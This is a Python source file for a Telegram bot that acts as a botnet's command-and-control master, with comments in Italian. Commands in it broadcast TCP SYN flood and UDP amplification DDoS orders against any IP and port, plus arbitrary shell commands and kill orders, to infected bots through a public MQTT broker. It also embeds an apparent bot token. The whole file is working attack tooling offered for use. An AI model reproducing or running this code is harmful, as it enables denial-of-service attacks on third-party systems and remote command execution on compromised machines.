#!/usr/bin/env python3
# C2 MASTER TELEGRAM - STESSA STRUTTURA ORIGINALE

import subprocess
import os
import signal
import ipaddress
import threading
import time
from telegram.ext import Updater, CommandHandler

# ================= CONFIG =================
TOKEN = "8404427083:AAEr0y_vDzAzvMRtZZ_mCxhzGXDiJFKS0XYe"
AUTHORIZED_ID = 5699538596
# =========================================

process = None
LAST_DESC = None
is_running_flag = False
progress_thread = None
progress_stop_event = threading.Event()
progress_message = None

# ================= UTILS =================
def is_authorized(update):
    return update.effective_user.id == AUTHORIZED_ID

def kill_process():
    global process, is_running_flag
    if process and process.poll() is None:
        os.killpg(os.getpgid(process.pid), signal.SIGTERM)
    process = None
    is_running_flag = False

# ================= PROGRESS BAR =================
def progress_bar_loop(context, chat_id, duration):
    global progress_message, is_running_flag
    start_time = time.time()
    while not progress_stop_event.is_set():
        elapsed = int(time.time() - start_time)
        remaining = duration - elapsed
        if remaining <= 0:
            kill_process()
            break

        percent = int((elapsed / duration) * 100)
        blocks = int(percent / 5)
        bar = "█" * blocks + "░" * (20 - blocks)

        text = f"{LAST_DESC}\n[{bar}] {percent}% ⏱ {remaining}s"

        try:
            progress_message.edit_text(text)
        except:
            pass
        time.sleep(1)
    is_running_flag = False

# ================= COMMANDS =================
def start(update, context):
    if not is_authorized(update): return
    update.message.reply_text(
        "🤖 C2 MASTER\n\n"
        "🔥 DDOS:\n"
        "  /tcpsyn IP PORT\n"
        "  /udpamp IP PORT\n\n"
        "🐚 /shell CMD\n"
        "💀 /kill\n\n"
        "/status – stato"
    )

def tcpsyn_command(update, context):
    global process, LAST_DESC, progress_thread, progress_stop_event, progress_message, is_running_flag
    
    if not is_authorized(update): return
    if is_running_flag:
        update.message.reply_text("⚠️ ATTACK IN CORSO")
        return
    if len(context.args) < 2:
        update.message.reply_text("❌ /tcpsyn IP PORT")
        return

    ip, port = context.args[0], context.args[1]
    try:
        ipaddress.ip_address(ip)
        int(port)
    except:
        update.message.reply_text("❌ IP:PORT INVALIDI")
        return

    # BROADCAST TCP SYN
    cmd_broadcast = f"mosquitto_pub -h broker.hivemq.com -t c2/broadcast -m 'tcpsyn:{ip}:{port}'"
    subprocess.Popen(cmd_broadcast, shell=True)
    
    LAST_DESC = f"TCP SYN → {ip}:{port}"
    progress_message = update.message.reply_text(LAST_DESC)
    is_running_flag = True
    progress_stop_event.clear()
    progress_thread = threading.Thread(
        target=progress_bar_loop, args=(context, update.effective_chat.id, 300), daemon=True
    )
    progress_thread.start()

def udpamp_command(update, context):
    global process, LAST_DESC, progress_thread, progress_stop_event, progress_message, is_running_flag
    
    if not is_authorized(update): return
    if is_running_flag:
        update.message.reply_text("⚠️ ATTACK IN CORSO")
        return
    if len(context.args) < 2:
        update.message.reply_text("❌ /udpamp IP PORT")
        return

    ip, port = context.args[0], context.args[1]
    try:
        ipaddress.ip_address(ip)
        int(port)
    except:
        update.message.reply_text("❌ IP:PORT INVALIDI")
        return

    # BROADCAST UDP AMP
    cmd_broadcast = f"mosquitto_pub -h broker.hivemq.com -t c2/broadcast -m 'udpamp:{ip}:{port}'"
    subprocess.Popen(cmd_broadcast, shell=True)
    
    LAST_DESC = f"UDP AMP → {ip}:{port}"
    progress_message = update.message.reply_text(LAST_DESC)
    is_running_flag = True
    progress_stop_event.clear()
    progress_thread = threading.Thread(
        target=progress_bar_loop, args=(context, update.effective_chat.id, 300), daemon=True
    )
    progress_thread.start()

def shell_command(update, context):
    if not is_authorized(update): return
    if not context.args:
        update.message.reply_text("❌ /shell CMD")
        return
    
    cmd = ' '.join(context.args)
    # BROADCAST SHELL
    cmd_broadcast = f"mosquitto_pub -h broker.hivemq.com -t c2/broadcast -m 'shell:{cmd}'"
    subprocess.Popen(cmd_broadcast, shell=True)
    update.message.reply_text(f"🐚 BROADCAST: {cmd}")

def kill_command(update, context):
    if not is_authorized(update): return
    # BROADCAST KILL
    subprocess.Popen("mosquitto_pub -h broker.hivemq.com -t c2/broadcast -m 'kill'", shell=True)
    update.message.reply_text("💀 KILL ALL")

def status_command(update, context):
    if not is_authorized(update): return
    status = "🟢" if is_running_flag else "🔴"
    update.message.reply_text(f"📊 STATUS\nAttack: {status}\n{LAST_DESC or 'IDLE'}")

def stop_command(update, context):
    if not is_authorized(update): return
    if is_running_flag:
        progress_stop_event.set()
        kill_process()
        subprocess.Popen("mosquitto_pub -h broker.hivemq.com -t c2/broadcast -m 'stop'", shell=True)
        update.message.reply_text("⛔ STOPPED")
    else:
        update.message.reply_text("ℹ️ NO ATTACK")

# ================= MAIN =================
def main():
    updater = Updater(TOKEN, use_context=True)
    dp = updater.dispatcher

    dp.add_handler(CommandHandler("start", start))
    dp.add_handler(CommandHandler("tcpsyn", tcpsyn_command))
    dp.add_handler(CommandHandler("udpamp", udpamp_command))
    dp.add_handler(CommandHandler("shell", shell_command))
    dp.add_handler(CommandHandler("kill", kill_command))
    dp.add_handler(CommandHandler("status", status_command))
    dp.add_handler(CommandHandler("stop", stop_command))

    updater.start_polling()
    updater.idle()

if __name__ == "__main__":
    main()
